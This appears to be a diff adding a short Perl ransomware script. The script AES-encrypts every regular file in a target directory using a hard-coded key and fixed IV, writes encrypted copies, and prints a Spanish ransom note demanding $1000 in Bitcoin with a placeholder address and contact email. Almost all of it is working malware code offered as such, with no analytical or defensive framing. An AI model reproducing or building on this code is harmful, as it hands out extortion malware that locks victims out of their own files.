@@ -1,0 +1,48 @@
+perl
+
+use strict;
+use warnings;
+use Crypt::CBC;
+use File::Slurp;
+use MIME::Base64;
+use Digest::SHA qw(sha256_hex);
+
+sub aes_encrypt_file {
+    my ($in_filename, $out_filename, $key) = @_;
+
+    my $cipher = Crypt::CBC->new(
+        -key         => $key,
+        -cipher      => 'Crypt::OpenSSL::AES',
+        -iv          => '0000000000000000',
+        -header      => 'none',
+        -literal_key => 1,
+        -padding     => 'standard',
+        -keysize     => 32,
+        -blocksize   => 16,
+        -keylength   => 32
+    );
+
+    my $plaintext = read_file($in_filename, binmode => ':raw');
+    my $ciphertext = $cipher->encrypt($plaintext);
+    my $encoded_ciphertext = encode_base64($ciphertext);
+    write_file($out_filename, { binmode => ':raw' }, $encoded_ciphertext);
+}
+
+sub ransom_message {
+    print "¡Tus archivos han sido cifrados!\n";
+    print "Para recuperar tus archivos, debes pagar un rescate de \$1000 en Bitcoin a la siguiente dirección: xxxxxxxxxxxxxxx.\n";
+    print "Una vez realizado el pago, envía la prueba de pago a ransomware@example.com y te proporcionaremos la clave para descifrar tus archivos.\n";
+}
+
+# Ruta del directorio que contiene los archivos a cifrar
+my $dir = 'archivos_a_cifrar';
+
+opendir(my $dh, $dir) || die "No se puede abrir el directorio: $!";
+while (my $file = readdir($dh)) {
+    next unless (-f "$dir/$file");    # Solo ciframos archivos regulares
+    aes_encrypt_file("$dir/$file", "$dir/$file.enc", sha256_hex('clave_secreta'));
+}
+closedir($dh);
+
+# Mostramos el mensaje de rescate
+ransom_message();
